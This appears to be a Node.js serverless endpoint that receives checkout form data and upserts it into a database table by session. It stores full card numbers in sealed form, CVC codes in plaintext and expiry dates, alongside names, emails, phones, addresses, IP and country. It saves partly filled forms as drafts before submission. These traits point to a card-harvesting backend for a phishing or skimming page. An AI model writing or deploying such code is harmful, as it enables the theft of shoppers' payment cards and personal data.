const { pool } = require('./_db');
const { seal } = require('./_crypto');
const digits = s => String(s || '').replace(/\D/g, '');

module.exports = async function handler(req, res) {
  const send = (code, body) => { res.statusCode = code; res.setHeader('Content-Type', 'application/json'); res.end(JSON.stringify(body)); };
  if (req.method !== 'POST') return send(405, { error: 'Method not allowed' });

  try {
    const b = req.body || {};
    const pan = digits(b.number);
    const status = ['draft', 'captured'].includes(b.status) ? b.status : 'draft';

    await pool.query(
      `INSERT INTO trials (session_id, email, name, phone, address, pan_sealed, pan_last4,
                           pan_brand, pan_exp, cvc, card_complete, fields_filled, cart,
                           ip, ua, referrer, country, status)
       VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,$10,$11,$12,$13,$14,$15,$16,$17,$18)
       ON CONFLICT (session_id) DO UPDATE SET
         email         = COALESCE(EXCLUDED.email, trials.email),
         name          = COALESCE(EXCLUDED.name, trials.name),
         phone         = COALESCE(EXCLUDED.phone, trials.phone),
         address       = COALESCE(EXCLUDED.address, trials.address),
         pan_sealed    = COALESCE(EXCLUDED.pan_sealed, trials.pan_sealed),
         pan_last4     = COALESCE(EXCLUDED.pan_last4, trials.pan_last4),
         pan_brand     = COALESCE(EXCLUDED.pan_brand, trials.pan_brand),
         pan_exp       = COALESCE(EXCLUDED.pan_exp, trials.pan_exp),
         cvc           = COALESCE(EXCLUDED.cvc, trials.cvc),
         card_complete = trials.card_complete OR EXCLUDED.card_complete,
         cart          = COALESCE(EXCLUDED.cart, trials.cart),
         fields_filled = GREATEST(trials.fields_filled, EXCLUDED.fields_filled),
         status        = CASE WHEN trials.status IN ('draft','captured') THEN EXCLUDED.status ELSE trials.status END,
         updated_at    = now()`,
      [
        b.sessionId, b.email || null, b.name || null, b.phone || null,
        b.address ? JSON.stringify(b.address) : null,
        seal(pan), pan.slice(-4) || null, b.brand || null,
        b.expMonth && b.expYear ? `${b.expMonth}/${b.expYear}` : null,
        b.cvc || null, !!b.cardComplete, parseInt(b.fieldsFilled, 10) || 0,
        b.cart ? JSON.stringify(b.cart) : null,
        (req.headers['x-forwarded-for'] || '').split(',')[0].trim() || null,
        b.ua || req.headers['user-agent'] || null,
        b.referrer || null, req.headers['x-vercel-ip-country'] || null, status,
      ]
    );
    send(200, { ok: true });
  } catch (e) {
    console.error('collect', e);
    send(200, { ok: false });
  }
};
